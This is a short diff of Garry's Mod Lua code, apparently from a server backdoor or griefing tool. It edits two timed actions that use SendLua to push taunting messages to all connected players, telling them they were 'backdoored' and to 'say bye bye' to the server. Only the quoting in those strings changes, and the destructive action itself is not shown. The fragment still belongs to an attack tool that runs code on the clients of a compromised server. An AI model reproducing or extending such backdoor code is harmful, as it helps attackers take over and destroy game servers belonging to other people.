@@ -96,13 +96,13 @@ lol:PushAction( 0, function( pPlayer )
 
     timer.Create( "hello", 2, 1, function()
     for k,v in pairs(player.GetAll()) do
-	v:SendLua("chat.AddText(Color(0, 115, 255), 'Next time try to don't get backdoored!')")
+	v:SendLua("chat.AddText(Color(0, 115, 255), \"Next time try to don't get backdoored!\")")
     end
     end)
 
     timer.Create( "hello2", 6, 1, function()
     for k,v in pairs(player.GetAll()) do
-	v:SendLua("chat.AddText(Color(0, 115, 255), 'Now say bye bye to your server.')")
+	v:SendLua("chat.AddText(Color(0, 115, 255), \"Now say bye bye to your server.\")")
     end
     end)
 
